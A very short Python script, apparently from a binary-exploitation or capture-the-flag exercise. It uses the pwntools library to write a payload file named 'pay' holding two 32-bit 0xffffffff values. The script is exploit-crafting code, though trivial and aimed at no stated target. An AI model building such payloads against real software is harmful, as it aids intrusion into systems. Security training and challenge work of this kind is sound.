from pwn import *

f = open("pay", "wb")

f.write(p32(0xffffffff))
f.write(p32(0xffffffff))
